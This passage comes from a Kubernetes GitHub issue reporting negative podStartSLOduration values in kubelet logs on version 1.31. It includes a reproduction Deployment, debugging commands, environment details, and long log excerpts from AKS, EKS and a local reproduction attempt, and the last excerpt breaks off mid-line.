podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.753171862 +0000 UTC m=+565.366021555\" **lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\"** observedRunningTime=\"2025-02-25 21:39:09.382750199 +0000 UTC m=+580.995599892\" watchObservedRunningTime=\"2025-02-25 21:39:09.383012397 +0000 UTC m=+580.995862090\"\n```\n\nFor the last 10 pods, the log is like this: pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-hgd78\" **podStartSLOduration=-9223372020.471764** podStartE2EDuration=\"16.383012397s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.753171862 +0000 UTC m=+565.366021555\" **lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\"** observedRunningTime=\"2025-02-25 21:39:09.382750199 +0000 UTC m=+580.995599892\" watchObservedRunningTime=\"2025-02-25 21:39:09.383012397 +0000 UTC m=+580.995862090\"\n\nI saw similar issue [here](https://github.com/kubernetes/kubernetes/issues/114903) and it's supposed to be fixed in k8s version 1.27\n\n\n\n### What did you expect to happen?\n\nThe result should be like the first 10 pods, but somehow it returned negative value for the last 10 pods:\nFeb 25 21:38:56 aks-userpool0-20459031-vmss000001 kubelet[3201]: I0225 21:38:56.323529    3201 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5fb68775dc-c74hl\" **podStartSLOduration=1.344002188** podStartE2EDuration=\"3.323519624s\" podCreationTimestamp=\"2025-02-25 21:38:53 +0000 UTC\" firstStartedPulling=\"2025-02-25 21:38:53.734807377 +0000 UTC m=+565.347657070\" **lastFinishedPulling=\"2025-02-25 21:38:55.714324713 +0000 UTC** m=+567.327174506\" observedRunningTime=\"2025-02-25 21:38:56.323492624 +0000 UTC m=+567.936342317\" watchObservedRunningTime=\"2025-02-25 21:38:56.323519624 +0000 UTC m=+567.936369517\"\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nCreate a cluster with kubernetes version 1.31. Use the following deployment to create pods \nDeployment spec\n```\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: resource-consume\n  labels:\n    group: resource-consume\nspec:\n  replicas: 20\n  selector:\n    matchLabels:\n      name: resource-consume\n  template:\n    metadata:\n      labels:\n        name: resource-consume\n        group: resource-consume\n    spec:\n      hostNetwork: true\n      nodeSelector:\n        kubernetes.io/hostname: \"aks-userpool0-20459031-vmss000001\"\n      containers:\n      - name: resource-consumer-memory\n        image: registry.k8s.io/e2e-test-images/resource-consumer:1.9\n        imagePullPolicy: IfNotPresent\n        command:\n          - stress\n        args:\n          - --vm\n          - \"1\"\n          - --vm-bytes\n          - 5000K\n          - --vm-hang\n          - \"0\"\n          - --timeout\n          - \"3600\"\n        resources:\n          requests:\n            memory: 5000Ki\n      tolerations:\n      - key: \"cri-resource-consume\"\n        operator: \"Equal\"\n        value: \"true\"\n        effect: \"NoSchedule\"\n      - key: \"cri-resource-consume\"\n        operator: \"Equal\"\n        value: \"true\"\n        effect: \"NoExecute\"\n```\nRun `kubectl node-shell` into the node to check kubelet log and grep the podStartE2EDuration\n```\nkubectl node-shell <node-name>\ncd var/log\ncat messages | grep pod_startup_latency_tracker\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\nClient Version: v1.31.0\nKustomize Version: v5.4.2\nServer Version: v1.31.5\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAKS\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\nPRETTY_NAME=\"Ubuntu 22.04.5 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.5 LTS (Jammy Jellyfish)\"\nVERSION_CODENAME=jammy\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=jammy\n$ uname -a\n# paste output here\nLinux aks-userpool0-20459031-vmss000001 5.15.0-1079-azure #88-Ubuntu SMP Thu Jan 16 19:18:54 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\ncontainerd://1.7.25-1\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n\n/sig node\n/kind bug\n/help", "issue_labels": ["kind/bug", "sig/node", "priority/important-longterm", "triage/accepted"], "comments": [{"author": "alyssa1303", "body": "/sig node"}, {"author": "alyssa1303", "body": "I observed same issue with EKS, so cloud provider is not related here\n```\nFeb 25 22:23:56 ip-10-0-91-209 kubelet: I0225 22:23:56.631131    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-65tbb\" podStartSLOduration=1.546927693 podStartE2EDuration=\"2.631123808s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.163506378 +0000 UTC m=+10440.454286709\" lastFinishedPulling=\"2025-02-25 22:23:56.247702507 +0000 UTC m=+10441.538482824\" observedRunningTime=\"2025-02-25 22:23:56.630931783 +0000 UTC m=+10441.921712121\" watchObservedRunningTime=\"2025-02-25 22:23:56.631123808 +0000 UTC m=+10441.921904147\"\nFeb 25 22:23:57 ip-10-0-91-209 kubelet: I0225 22:23:57.386200    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-45bzd\" podStartSLOduration=-9223372033.468592 podStartE2EDuration=\"3.386184373s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.520600231 +0000 UTC m=+10440.811380547\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:23:57.38500166 +0000 UTC m=+10442.675781999\" watchObservedRunningTime=\"2025-02-25 22:23:57.386184373 +0000 UTC m=+10442.676964712\"\nFeb 25 22:23:57 ip-10-0-91-209 kubelet: I0225 22:23:57.399827    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-s9f8b\" podStartSLOduration=-9223372033.454958 podStartE2EDuration=\"3.399816932s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.520564068 +0000 UTC m=+10440.811344403\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:23:57.399470898 +0000 UTC m=+10442.690251237\" watchObservedRunningTime=\"2025-02-25 22:23:57.399816932 +0000 UTC m=+10442.690597270\"\nFeb 25 22:23:57 ip-10-0-91-209 kubelet: I0225 22:23:57.419389    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-rqfls\" podStartSLOduration=2.665023156 podStartE2EDuration=\"3.41938171s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.519728801 +0000 UTC m=+10440.810509133\" lastFinishedPulling=\"2025-02-25 22:23:56.274087357 +0000 UTC m=+10441.564867687\" observedRunningTime=\"2025-02-25 22:23:57.41927327 +0000 UTC m=+10442.710053610\" watchObservedRunningTime=\"2025-02-25 22:23:57.41938171 +0000 UTC m=+10442.710162050\"\nFeb 25 22:23:57 ip-10-0-91-209 kubelet: I0225 22:23:57.434143    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-5v4j5\" podStartSLOduration=-9223372033.42064 podStartE2EDuration=\"3.434135031s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.520488933 +0000 UTC m=+10440.811269250\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:23:57.433087607 +0000 UTC m=+10442.723867946\" watchObservedRunningTime=\"2025-02-25 22:23:57.434135031 +0000 UTC m=+10442.724915371\"\nFeb 25 22:24:08 ip-10-0-91-209 kubelet: I0225 22:24:08.024215    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-dvkq6\" podStartSLOduration=12.852415203 podStartE2EDuration=\"14.024202075s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.101434339 +0000 UTC m=+10440.392214660\" lastFinishedPulling=\"2025-02-25 22:23:56.273221215 +0000 UTC m=+10441.564001532\" observedRunningTime=\"2025-02-25 22:23:57.453636416 +0000 UTC m=+10442.744416753\" watchObservedRunningTime=\"2025-02-25 22:24:08.024202075 +0000 UTC m=+10453.314982413\"\nFeb 25 22:24:08 ip-10-0-91-209 kubelet: I0225 22:24:08.413462    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-fj8cp\" podStartSLOduration=-9223372022.441326 podStartE2EDuration=\"14.413449266s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.199151934 +0000 UTC m=+10440.489932252\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:24:08.412149749 +0000 UTC m=+10453.702930088\" watchObservedRunningTime=\"2025-02-25 22:24:08.413449266 +0000 UTC m=+10453.704229603\"\nFeb 25 22:24:10 ip-10-0-91-209 kubelet: I0225 22:24:10.414060    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-kvzm2\" podStartSLOduration=-9223372020.440725 podStartE2EDuration=\"16.41405031s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.233269552 +0000 UTC m=+10440.524049868\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:24:10.413714446 +0000 UTC m=+10455.704494785\" watchObservedRunningTime=\"2025-02-25 22:24:10.41405031 +0000 UTC m=+10455.704830649\"\nFeb 25 22:24:10 ip-10-0-91-209 kubelet: I0225 22:24:10.433791    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-5sngx\" podStartSLOduration=-9223372020.420994 podStartE2EDuration=\"16.433781479s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.196000401 +0000 UTC m=+10440.486780732\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:24:10.433756073 +0000 UTC m=+10455.724536413\" watchObservedRunningTime=\"2025-02-25 22:24:10.433781479 +0000 UTC m=+10455.724561819\"\nFeb 25 22:24:10 ip-10-0-91-209 kubelet: I0225 22:24:10.463454    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-lvzwl\" podStartSLOduration=-9223372020.39133 podStartE2EDuration=\"16.46344522s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.196818306 +0000 UTC m=+10440.487598623\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:24:10.448051989 +0000 UTC m=+10455.738832327\" watchObservedRunningTime=\"2025-02-25 22:24:10.46344522 +0000 UTC m=+10455.754225612\"\nFeb 25 22:24:10 ip-10-0-91-209 kubelet: I0225 22:24:10.463513    4578 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-7485567c97-qp8j6\" podStartSLOduration=-9223372020.391266 podStartE2EDuration=\"16.463509885s\" podCreationTimestamp=\"2025-02-25 22:23:54 +0000 UTC\" firstStartedPulling=\"2025-02-25 22:23:55.196687275 +0000 UTC m=+10440.487467592\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-02-25 22:24:10.462599237 +0000 UTC m=+10455.753379575\" watchObservedRunningTime=\"2025-02-25 22:24:10.463509885 +0000 UTC m=+10455.754290224\"\n```\nKubernetes version\n```\nkubectl version\nClient Version: v1.31.0\nKustomize Version: v5.4.2\nServer Version: v1.31.5-eks-8cce635\n```\n\nOS Version\n```\n[root@ip-10-0-91-209 /]# cat /etc/os-release\nNAME=\"Amazon Linux\"\nVERSION=\"2\"\nID=\"amzn\"\nID_LIKE=\"centos rhel fedora\"\nVERSION_ID=\"2\"\nPRETTY_NAME=\"Amazon Linux 2\"\nANSI_COLOR=\"0;33\"\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2\"\nHOME_URL=\"https://amazonlinux.com/\"\nSUPPORT_END=\"2026-06-30\"\n```\n\nSame containerd version containerd://1.7.25"}, {"author": "alyssa1303", "body": "I believe this will also return negative sum as mentioned in this issue [122675](https://github.com/kubernetes/kubernetes/issues/122675)"}, {"author": "HirazawaUi", "body": "I used the same **deployment** as yours to create an ephemeral cluster with the latest code from the master branch, but couldn't reproduce the issue. I'm uncertain whether this problem has been fixed. Below are the logs I collected:\n\n<details>\n\n<summary>Logs</summary>\n\n```ruby\nI0303 21:35:18.339956  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-k2c9f\" podStartSLOduration=1.339952031 podStartE2EDuration=\"1.339952031s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.336329531 +0800 CST m=+435.857825042\" watchObservedRunningTime=\"2025-03-03 21:35:18.339952031 +0800 CST m=+435.861447542\"\nI0303 21:35:18.343086  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-p5qbp\" podStartSLOduration=1.343083239 podStartE2EDuration=\"1.343083239s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.342692656 +0800 CST m=+435.864188126\" watchObservedRunningTime=\"2025-03-03 21:35:18.343083239 +0800 CST m=+435.864578709\"\nI0303 21:35:18.343225  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-929fx\" podStartSLOduration=1.343223197 podStartE2EDuration=\"1.343223197s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.340088281 +0800 CST m=+435.861583751\" watchObservedRunningTime=\"2025-03-03 21:35:18.343223197 +0800 CST m=+435.864718709\"\nI0303 21:35:18.345020  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-rcpfj\" podStartSLOduration=1.345017072 podStartE2EDuration=\"1.345017072s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.344771906 +0800 CST m=+435.866267376\" watchObservedRunningTime=\"2025-03-03 21:35:18.345017072 +0800 CST m=+435.866512542\"\nI0303 21:35:18.347275  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-dxblk\" podStartSLOduration=1.347271989 podStartE2EDuration=\"1.347271989s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.347191572 +0800 CST m=+435.868687084\" watchObservedRunningTime=\"2025-03-03 21:35:18.347271989 +0800 CST m=+435.868767501\"\nI0303 21:35:18.351837  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-nx2xl\" podStartSLOduration=1.351804781 podStartE2EDuration=\"1.351804781s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.349441614 +0800 CST m=+435.870937084\" watchObservedRunningTime=\"2025-03-03 21:35:18.351804781 +0800 CST m=+435.873300251\"\nI0303 21:35:18.355502  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-2wjvt\" podStartSLOduration=1.355498197 podStartE2EDuration=\"1.355498197s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.351807614 +0800 CST m=+435.873303084\" watchObservedRunningTime=\"2025-03-03 21:35:18.355498197 +0800 CST m=+435.876993709\"\nI0303 21:35:18.358516  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-hq4t7\" podStartSLOduration=1.3585131559999999 podStartE2EDuration=\"1.358513156s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.356250739 +0800 CST m=+435.877746209\" watchObservedRunningTime=\"2025-03-03 21:35:18.358513156 +0800 CST m=+435.880008626\"\nI0303 21:35:18.360975  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-rf84h\" podStartSLOduration=1.360972114 podStartE2EDuration=\"1.360972114s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.358677864 +0800 CST m=+435.880173376\" watchObservedRunningTime=\"2025-03-03 21:35:18.360972114 +0800 CST m=+435.882467584\"\nI0303 21:35:18.361043  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-6p7lf\" podStartSLOduration=1.361042156 podStartE2EDuration=\"1.361042156s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.360874322 +0800 CST m=+435.882369792\" watchObservedRunningTime=\"2025-03-03 21:35:18.361042156 +0800 CST m=+435.882537626\"\nI0303 21:35:18.363188  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-xxjjx\" podStartSLOduration=1.363185447 podStartE2EDuration=\"1.363185447s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.363101739 +0800 CST m=+435.884597251\" watchObservedRunningTime=\"2025-03-03 21:35:18.363185447 +0800 CST m=+435.884680917\"\nI0303 21:35:18.367650  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-9sxn7\" podStartSLOduration=1.367647072 podStartE2EDuration=\"1.367647072s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.365385364 +0800 CST m=+435.886880876\" watchObservedRunningTime=\"2025-03-03 21:35:18.367647072 +0800 CST m=+435.889142584\"\nI0303 21:35:18.369954  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-z9pmz\" podStartSLOduration=1.3699486140000001 podStartE2EDuration=\"1.369948614s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.367751072 +0800 CST m=+435.889246542\" watchObservedRunningTime=\"2025-03-03 21:35:18.369948614 +0800 CST m=+435.891444126\"\nI0303 21:35:18.372498  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-4dmbx\" podStartSLOduration=1.372488906 podStartE2EDuration=\"1.372488906s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.370205072 +0800 CST m=+435.891700542\" watchObservedRunningTime=\"2025-03-03 21:35:18.372488906 +0800 CST m=+435.893984376\"\nI0303 21:35:18.374883  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-kxjqs\" podStartSLOduration=1.374880572 podStartE2EDuration=\"1.374880572s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.372424656 +0800 CST m=+435.893920167\" watchObservedRunningTime=\"2025-03-03 21:35:18.374880572 +0800 CST m=+435.896376042\"\nI0303 21:35:18.374908  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-cx9hp\" podStartSLOduration=1.3749066970000001 podStartE2EDuration=\"1.374906697s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.374745781 +0800 CST m=+435.896241292\" watchObservedRunningTime=\"2025-03-03 21:35:18.374906697 +0800 CST m=+435.896402209\"\nI0303 21:35:18.376812  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-247fl\" podStartSLOduration=1.376809739 podStartE2EDuration=\"1.376809739s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.376768572 +0800 CST m=+435.898264084\" watchObservedRunningTime=\"2025-03-03 21:35:18.376809739 +0800 CST m=+435.898305251\"\nI0303 21:35:18.380977  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-7vgp7\" podStartSLOduration=1.380974697 podStartE2EDuration=\"1.380974697s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.378908156 +0800 CST m=+435.900403667\" watchObservedRunningTime=\"2025-03-03 21:35:18.380974697 +0800 CST m=+435.902470167\"\nI0303 21:35:18.382567  957856 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-77c84fc845-hrt58\" podStartSLOduration=1.382563614 podStartE2EDuration=\"1.382563614s\" podCreationTimestamp=\"2025-03-03 21:35:17 +0800 CST\" firstStartedPulling=\"0001-01-01 00:00:00 +0000 UTC\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-03 21:35:18.380900989 +0800 CST m=+435.902396501\" watchObservedRunningTime=\"2025-03-03 21:35:18.382563614 +0800 CST m=+435.904059084\"\n```\n</details>"}, {"author": "HirazawaUi", "body": "I've attempted to manually remove the existing local images and recreate the same scenario as your environment, but still can't reproduce the issue. Maybe should inject delays to simulate this conditions?\n\n<details>\n\n<summary>Logs</summary>\n\n\n```ruby\nI0303 22:04:59.325768 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-95ksv\" podStartSLOduration=2.174478752 podStartE2EDuration=\"10.325758672s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.516914417 +0800 CST m=+1356.015431398\" lastFinishedPulling=\"2025-03-03 22:04:57.668194379 +0800 CST m=+1364.166711318\" observedRunningTime=\"2025-03-03 22:04:58.323529671 +0800 CST m=+1364.822046652\" watchObservedRunningTime=\"2025-03-03 22:04:59.325758672 +0800 CST m=+1365.824275652\"\nI0303 22:04:59.325924 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-rlw9c\" podStartSLOduration=1.079496251 podStartE2EDuration=\"10.325920922s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.541529584 +0800 CST m=+1356.040046523\" lastFinishedPulling=\"2025-03-03 22:04:58.787954213 +0800 CST m=+1365.286471194\" observedRunningTime=\"2025-03-03 22:04:59.325567213 +0800 CST m=+1365.824084194\" watchObservedRunningTime=\"2025-03-03 22:04:59.325920922 +0800 CST m=+1365.824437902\"\nI0303 22:05:00.330085 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-t7ksg\" podStartSLOduration=1.064315459 podStartE2EDuration=\"11.330075464s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.581635 +0800 CST m=+1356.080151939\" lastFinishedPulling=\"2025-03-03 22:04:59.847394964 +0800 CST m=+1366.345911944\" observedRunningTime=\"2025-03-03 22:05:00.329974422 +0800 CST m=+1366.828491361\" watchObservedRunningTime=\"2025-03-03 22:05:00.330075464 +0800 CST m=+1366.828592444\"\nI0303 22:05:02.334580 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-ndk62\" podStartSLOduration=2.058409792 podStartE2EDuration=\"13.334571131s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.586911125 +0800 CST m=+1356.085428106\" lastFinishedPulling=\"2025-03-03 22:05:00.863072506 +0800 CST m=+1367.361589445\" observedRunningTime=\"2025-03-03 22:05:01.329559464 +0800 CST m=+1367.828076445\" watchObservedRunningTime=\"2025-03-03 22:05:02.334571131 +0800 CST m=+1368.833088112\"\nI0303 22:05:03.338761 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-llv4n\" podStartSLOduration=2.111236168 podStartE2EDuration=\"14.338729257s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.634255292 +0800 CST m=+1356.132772231\" lastFinishedPulling=\"2025-03-03 22:05:01.86174834 +0800 CST m=+1368.360265320\" observedRunningTime=\"2025-03-03 22:05:02.335814381 +0800 CST m=+1368.834331320\" watchObservedRunningTime=\"2025-03-03 22:05:03.338729257 +0800 CST m=+1369.837246238\"\nI0303 22:05:03.338877 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-gxjjw\" podStartSLOduration=1.098041376 podStartE2EDuration=\"14.338873382s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.6369555 +0800 CST m=+1356.135472481\" lastFinishedPulling=\"2025-03-03 22:05:02.877787507 +0800 CST m=+1369.376304487\" observedRunningTime=\"2025-03-03 22:05:03.338740965 +0800 CST m=+1369.837257904\" watchObservedRunningTime=\"2025-03-03 22:05:03.338873382 +0800 CST m=+1369.837390363\"\nI0303 22:05:04.347555 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-js2zf\" podStartSLOduration=1.120524126 podStartE2EDuration=\"15.347543049s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.643618209 +0800 CST m=+1356.142135148\" lastFinishedPulling=\"2025-03-03 22:05:03.87063709 +0800 CST m=+1370.369154071\" observedRunningTime=\"2025-03-03 22:05:04.347417341 +0800 CST m=+1370.845934321\" 